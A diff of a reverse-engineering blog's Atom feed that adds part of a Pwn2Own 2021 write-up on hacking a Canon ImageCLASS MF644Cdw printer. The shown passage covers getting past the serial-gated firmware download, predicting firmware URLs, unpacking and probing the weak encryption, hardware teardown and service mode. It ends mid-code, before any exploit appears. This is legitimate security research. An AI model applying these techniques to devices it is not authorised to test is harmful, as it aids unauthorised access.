@@ -1,5 +1,816 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer</title><link href="https://doar-e.github.io/" rel="alternate"></link><link href="https://doar-e.github.io/feeds/all-english.atom.xml" rel="self"></link><id>https://doar-e.github.io/</id><updated>2022-03-26T08:00:00-07:00</updated><entry><title>Competing in Pwn2Own 2021 Austin: Icarus at the Zenith</title><link href="https://doar-e.github.io/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/" rel="alternate"></link><published>2022-03-26T08:00:00-07:00</published><updated>2022-03-26T08:00:00-07:00</updated><author><name>Axel "0vercl0k" Souchet</name></author><id>tag:doar-e.github.io,2022-03-26:/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer</title><link href="https://doar-e.github.io/" rel="alternate"></link><link href="https://doar-e.github.io/feeds/all-english.atom.xml" rel="self"></link><id>https://doar-e.github.io/</id><updated>2022-06-11T08:00:00-07:00</updated><entry><title>Pwn2Own 2021 Canon ImageCLASS MF644Cdw writeup</title><link href="https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/" rel="alternate"></link><published>2022-06-11T08:00:00-07:00</published><updated>2022-06-11T08:00:00-07:00</updated><author><name>Nicolas "NK" Devillers &amp; Jean-Romain "JRomainG" Garnier &amp; Raphaël "_trou_" Rigo</name></author><id>tag:doar-e.github.io,2022-06-11:/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://www.zerodayinitiative.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more"&gt;Pwn2Own Austin 2021&lt;/a&gt; was announced in August 2021 and introduced new categories, including printers. Based on our previous experience with printers, we decided to go after one of the three models. Among those, the &lt;a href="https://www.usa.canon.com/internet/portal/us/home/products/details/printers/color-laser/color-imageclass-mf644cdw"&gt;Canon ImageCLASS MF644Cdw&lt;/a&gt; seemed like the most interesting target: previous research was limited (mostly targeting …&lt;/p&gt;</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://www.zerodayinitiative.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more"&gt;Pwn2Own Austin 2021&lt;/a&gt; was announced in August 2021 and introduced new categories, including printers. Based on our previous experience with printers, we decided to go after one of the three models. Among those, the &lt;a href="https://www.usa.canon.com/internet/portal/us/home/products/details/printers/color-laser/color-imageclass-mf644cdw"&gt;Canon ImageCLASS MF644Cdw&lt;/a&gt; seemed like the most interesting target: previous research was limited (mostly targeting Pixma inkjet printers). Based on this, we started analyzing the firmware before even having bought the printer.&lt;/p&gt;
+&lt;p&gt;Our team was composed of 3 members:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Nicolas Devillers (&lt;a href="https://twitter.com/nikaiw"&gt;@nikaiw&lt;/a&gt;),&lt;/li&gt;
+&lt;li&gt;Jean-Romain Garnier (&lt;a href="https://twitter.com/JRomainG"&gt;@JRomainG&lt;/a&gt;),&lt;/li&gt;
+&lt;li&gt;Raphaël Rigo (&lt;a href="https://twitter.com/_trou_"&gt;@_trou_&lt;/a&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This writeup is based on version 10.02 of the printer's firmware, the latest available at the time of Pwn2Own.&lt;/p&gt;
+&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#firmware-extraction-and-analysis"&gt;Firmware extraction and analysis&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#downloading-firmware"&gt;Downloading firmware&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#predicting-firmware-urls"&gt;Predicting firmware URLs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#firmware-types"&gt;Firmware types&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#decryption-black-box-attempts"&gt;Decryption: black box attempts&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#basic-firmware-extraction"&gt;Basic firmware extraction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#weak-encryption-but-how-weak"&gt;Weak encryption, but how weak?&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#hardware-first-look"&gt;Hardware: first look&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#main-board-and-serial-port"&gt;Main board and serial port&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#service-mode"&gt;Service mode&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#decrypting-firmware"&gt;Decrypting firmware&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#program-synthesis-approach"&gt;Program synthesis approach&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#exploiting-setup"&gt;Exploiting setup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#serial-port-dry-shell"&gt;Serial port: dry shell&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#vulnerability"&gt;Vulnerability&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#attack-surface"&gt;Attack surface&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#vulnerable-function"&gt;Vulnerable function&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ntpv-functions"&gt;ntpv functions&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#exploitation"&gt;Exploitation&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#triggering-the-bug"&gt;Triggering the bug&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#buffer-overflow"&gt;Buffer overflow&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bjnp"&gt;BJNP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#initial-poc"&gt;Initial PoC&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#payload"&gt;Payload&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#displaying-an-image"&gt;Displaying an image&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ftp"&gt;FTP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#file-system"&gt;File system&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#putting-everything-together"&gt;Putting everything together&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#patch"&gt;Patch&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="firmware-extraction-and-analysis"&gt;Firmware extraction and analysis&lt;/h1&gt;
+&lt;h2 id="downloading-firmware"&gt;Downloading firmware&lt;/h2&gt;
+&lt;p&gt;The Canon website is interesting: you cannot download the firmware for a particular model without having a serial number which matches that model. This, as you might guess, is particularly annoying when you want to download a firmware for a model you do not own. Two options came to our mind:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Finding a picture of the model in a review or listing,&lt;/li&gt;
+&lt;li&gt;Finding a serial number of the same model on Shodan.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Thankfully, the MFC644cdw was &lt;a href="https://www.pcmag.com/reviews/canon-color-imageclass-mf644cdw"&gt;reviewed&lt;/a&gt; in details by PCmag, and one of the pictures contained the serial number of the printer used for the review. This allowed us to download a firmware from the Canon USA &lt;a href="https://www.usa.canon.com/internet/portal/us/home/support/details/printers/color-laser/color-imageclass-mf644cdw"&gt;website&lt;/a&gt;. The version available online at the time on that website was &lt;code&gt;06.03&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="predicting-firmware-urls"&gt;Predicting firmware URLs&lt;/h3&gt;
+&lt;p&gt;As a side note, once the serial number was obtained, we could download several version of the firmware, for different operating systems. For example, version &lt;code&gt;06.03&lt;/code&gt; for macOS has the following filename: &lt;code&gt;mac-mf644-a-fw-v0603-64.dmg&lt;/code&gt; and the associated download link is &lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do?id=OTUwMzkyMzJk&amp;amp;cmp=ABR&amp;amp;lang=EN&lt;/code&gt;. As the URL implies, this page asks for the serial number and redirects you to the actual firmware if the serial is valid. In that case: &lt;code&gt;https://gdlp01.c-wss.com/gds/5/0400006275/01/mac-mf644-a-fw-v0603-64.dmg&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Of course, the base64 encoded &lt;code&gt;id&lt;/code&gt; in the first URL is interesting: once decoded, you get the (literal string) &lt;code&gt;95039232d&lt;/code&gt;, which in turn, is the hex representation of &lt;code&gt;40000627501&lt;/code&gt;, which is part of the actual firmware URL!&lt;/p&gt;
+&lt;p&gt;A few more examples led us to understand that the part of the URL with the single digit (&lt;code&gt;/5/&lt;/code&gt; in our case) is just the last digit of the next part of the URL's path (&lt;code&gt;/0400006275/&lt;/code&gt; in this example). We assume this is probably used for load balancing or another similar reason. Using this knowledge, we were able to download a &lt;em&gt;lot&lt;/em&gt; of different firmware images for various models. We also found out that Canon pages for USA or Europe are not as current as the &lt;a href="https://cweb.canon.jp/drv-upd/satera-mfp/mf644cdw-firm-win.html"&gt;Japanese page&lt;/a&gt; which had version &lt;code&gt;09.01&lt;/code&gt; at the time of writing.&lt;/p&gt;
+&lt;p&gt;However, all of them lag behind the reality: the latest firmware version was &lt;code&gt;10.02&lt;/code&gt;, which is actually retrieved by the printer's firmware update mechanism. &lt;code&gt;https://gdlp01.c-wss.com/rmds/oi/fwupdate/mf640c_740c_lbp620c_660c/contents.xml&lt;/code&gt; gives us the actual up-to-date version.&lt;/p&gt;
+&lt;h3 id="firmware-types"&gt;Firmware types&lt;/h3&gt;
+&lt;p&gt;A small note about firmware "types". The update XML has 3 different entries per content kind:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;contents-information&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;content&lt;/span&gt; &lt;span class="na"&gt;kind=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;bootable&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;deliveryCount=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1003&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;base_url=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;id&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;OTUwMzZkMDQ5&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cmp&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z03&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lang&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;JA&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/content&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;content&lt;/span&gt; &lt;span class="na"&gt;kind=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;bootable&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;deliveryCount=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1003&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;base_url=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;id&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;OTUwMzZkMGFk&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cmp&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z03&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lang&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;JA&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/content&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;content&lt;/span&gt; &lt;span class="na"&gt;kind=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;bootable&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;3&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;deliveryCount=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1003&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;base_url=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;id&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;OTUwMzZkMTEx&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cmp&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z03&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;query&lt;/span&gt; &lt;span class="na"&gt;arg=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lang&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;JA&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/content&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Which correspond to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEA_V10.02.bin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEB_V10.02.bin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEC_V10.02.bin&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Each type corresponds to one of the models listed in the XML URL:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MF640C =&amp;gt; TYPEA&lt;/li&gt;
+&lt;li&gt;MF740C =&amp;gt; TYPEB&lt;/li&gt;
+&lt;li&gt;LBP620C =&amp;gt; TYPEC&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="decryption-black-box-attempts"&gt;Decryption: black box attempts&lt;/h2&gt;
+&lt;h3 id="basic-firmware-extraction"&gt;Basic firmware extraction&lt;/h3&gt;
+&lt;p&gt;Windows updates such as &lt;code&gt;win-mf644-a-fw-v0603.exe&lt;/code&gt; are Zip SFX files, which contain the actual updater: &lt;code&gt;mf644c_v0603_typea_w.exe&lt;/code&gt;. This is the end of the PE file as seen in &lt;a href="http://hiew.ru"&gt;Hiew&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;004767F0:  58 50 41 44-44 49 4E 47-50 41 44 44-49 4E 47 58  XPADDINGPADDINGX
+00072C00:  4E 43 46 57-00 00 00 00-3D 31 5D 08-20 00 00 00  NCFW    =1]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As you can see (the address changes from RVA to physical offset), the firmware update seems to be stored at the end of the PE as an overlay, and conveniently starts with a &lt;code&gt;NCFW&lt;/code&gt; magic header. MacOS firmware updates can be extracted with 7z and contain a big file: &lt;code&gt;mf644c_v0603_typea_m64.app/Contents/Resources/.USTBINDDATA&lt;/code&gt; which is almost the same as the Windows overlay except for the PE signature, and some offsets. &lt;/p&gt;
+&lt;p&gt;After looking at a bunch of firmware, it became clear that the footer of the update contains information about various parts of the firmware update, including a nice &lt;code&gt;USTINFO.TXT&lt;/code&gt; file which describes the target model, etc. The &lt;code&gt;NCFW&lt;/code&gt; magic also appears several times in the biggest "file" described by the UST footer. After some trial and error, its format was understood and allowed us to split the firmware into its basic components.&lt;/p&gt;
+&lt;p&gt;All this information was compiled into the &lt;a href="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/unpack_fw.py"&gt;unpack_fw.py&lt;/a&gt; script.&lt;/p&gt;
+&lt;h3 id="weak-encryption-but-how-weak"&gt;Weak encryption, but how weak?&lt;/h3&gt;
+&lt;p&gt;The main firmware file &lt;code&gt;Bootable.bin.sig&lt;/code&gt; is encrypted, but it seems encrypted with a very simple algorithm, as we can determine by looking at the patterns:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;00000040  20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  !&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./
+00000050  30 31 32 33 34 35 36 37 38 39 3A 3B 39 FC E8 7A 0123456789:;9..z
+00000060  34 35 4F 50 44 45 46 37 48 49 CA 4B 4D 4E 4F 50 45OPDEF7HI.KMNOP
+00000070  51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 QRSTUVWXYZ[\]^_`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The usual assumption of having big chunks of &lt;code&gt;00&lt;/code&gt; or &lt;code&gt;FF&lt;/code&gt; in the plaintext firmware allows us to have different hypothesis about the potential encryption algorithm. The increasing numbers most probably imply some sort of byte counter. We then tried to combine it with some basic operations and tried to decrypt:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A xor with a byte counter =&amp;gt; fail&lt;/li&gt;
+&lt;li&gt;A xor with counter and feedback =&amp;gt; fail&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Attempting to use a known plaintext (where the plaintext is not &lt;code&gt;00&lt;/code&gt; or &lt;code&gt;FF&lt;/code&gt;) was impossible at this stage as we did not have a decrypted firmware image yet. Having a reverser in the team, the obvious next step was to try to find code which implements the decryption:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The updater tool does not decrypt the firmware but sends it as-is =&amp;gt; fail&lt;/li&gt;
+&lt;li&gt;Check the firmware of previous models to try to find unencrypted code which
+    supports encrypted "NCFW" updates:&lt;ul&gt;
+&lt;li&gt;FAIL&lt;/li&gt;
+&lt;li&gt;However, we found unencrypted firmware files with a similar structure which
+    gave use a bit of known plaintext, but did not give any real clue about the
+    solution&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id="hardware-first-look"&gt;Hardware: first look&lt;/h1&gt;
+&lt;h2 id="main-board-and-serial-port"&gt;Main board and serial port&lt;/h2&gt;
+&lt;p&gt;Once we received the printer, we of course started dismantling it to look for interesting hardware features and ways to help us get access to the firmware.&lt;/p&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling1.jpg" /&gt;&lt;/td&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling2.jpg"/&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling3.jpg" /&gt;&lt;/td&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling4.jpg"/&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Looking at the hardware we considered these different approaches to obtain more information:&lt;/li&gt;
+&lt;li&gt;An SPI is present on the mainboard, read it
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/spidump1.jpg" /&gt;&lt;/td&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/spidump2.jpg" /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;&lt;/li&gt;
+&lt;li&gt;An Unsolder eMMC is present on the mainboard, read it&lt;/li&gt;
+&lt;li&gt;Find an older model, with unencrypted firmware and simpler flash to unsolder, read, profit. Fortunately, we did not have to go further in this direction.&lt;/li&gt;
+&lt;li&gt;Some printers are known to have a &lt;a href="https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell"&gt;serial port for debug&lt;/a&gt; providing a mini shell. Find one and use it to run debug commands in order to get plaintext/memory dump (&lt;strong&gt;NOTE&lt;/strong&gt; &lt;em&gt;of course&lt;/em&gt; we found the serial port afterwards)
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/uart1.jpg" /&gt;&lt;/td&gt;&lt;td&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/uart2.jpg" /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="service-mode"&gt;Service mode&lt;/h2&gt;
+&lt;p&gt;All enterprise printers have a service mode, intended for technicians to diagnose potential problems. YouTube is a good source of info on how to enter it. On this model, the dance is a &lt;a href="https://www.youtube.com/watch?v=eOhFyqYO9-8"&gt;bit weird&lt;/a&gt; as one must press "invisible" buttons. Once in service mode, debug logs can be dumped on a USB stick, which creates several files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SUBLOG.TXT&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SUBLOG.BIN&lt;/code&gt; is obviously &lt;code&gt;SUBLOG.TXT&lt;/code&gt;, encrypted with an algorithm which exhibits the same patterns as the encrypted firmware.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="decrypting-firmware"&gt;Decrypting firmware&lt;/h2&gt;
+&lt;h3 id="program-synthesis-approach"&gt;Program synthesis approach&lt;/h3&gt;
+&lt;p&gt;At this point, this was our train of thought:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The encryption algorithm seemed "trivial" (lots of patterns, byte by byte)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SUBLOG.TXT&lt;/code&gt; gave us lots of plaintext&lt;/li&gt;
+&lt;li&gt;We were too lazy to find it by blackbox/reasoning&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As program synthesis has evolved quite fast in the past years, we decided to try to get a tool to synthesize the decryption algorithm for us. We of course used the known plaintext from &lt;code&gt;SUBLOG.TXT&lt;/code&gt;, which can be used as constraints. &lt;a href="https://emina.github.io/rosette"&gt;Rosette&lt;/a&gt; seemed easy to use and well suited, so we went with that. We started following a nice &lt;a href="https://www.cs.utexas.edu/~bornholt/post/building-synthesizer.html"&gt;tutorial&lt;/a&gt; which worked over the integers, but gave us a bit of a headache when trying to directly convert it to &lt;code&gt;bitvectors&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;However, we quickly realized that we didn't have to &lt;code&gt;synthesize&lt;/code&gt; a program (for all inputs), but actually &lt;code&gt;solve&lt;/code&gt; an equation where the unknown was the program which would satisfy all the constraints built using the known plaintext/ciphertext pairs. The "Essential" guide to Rosette covers this in an &lt;a href="https://docs.racket-lang.org/rosette-guide/ch_essentials.html#%28part._sec~3asynthesize%29"&gt;example&lt;/a&gt; for us. So we started by defining the "program" grammar and &lt;code&gt;crypt&lt;/code&gt; function, which
+defines a program using the grammar, with two operands, up to 3 layers deep:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt; &lt;span class="n"&gt;int8?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bitvector&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bv&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;int8?&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;define-grammar&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fast-int8&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;; Grammar of int32 expressions over two inputs:&lt;/span&gt;
+  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;expr&lt;/span&gt;
